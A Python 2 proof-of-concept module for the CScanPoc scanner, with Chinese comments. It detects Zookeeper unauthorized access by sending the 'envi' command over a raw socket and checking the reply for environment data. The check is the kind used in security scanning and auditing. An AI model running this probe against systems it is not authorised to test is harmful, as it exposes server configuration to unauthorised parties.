# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import socket
import urlparse

class Vuln(ABVuln):
    vuln_id = 'Zookeeper_0000' # 平台漏洞编号
    name = 'Zookeeper未授权访问' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2016-08-09'  # 漏洞公布时间
    desc = '''
        Zookeeper Unauthorized access.
    ''' # 漏洞描述
    ref = 'https://hackerone.com/reports/154369' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zookeeper'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3c6b7330-5012-4a6c-bd45-d2f2f631abef' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            timeout = 5
            arg = '{target}'.format(target=self.target)
            url = urlparse.urlparse(arg)
            ip = socket.gethostbyname(url.hostname)
            port = url.port if url.port else 80
            socket.setdefaulttimeout(timeout)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            flag = "envi"
            s.send(flag)
            data = s.recv(1024)
            s.close()
            if 'Environment' in data:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()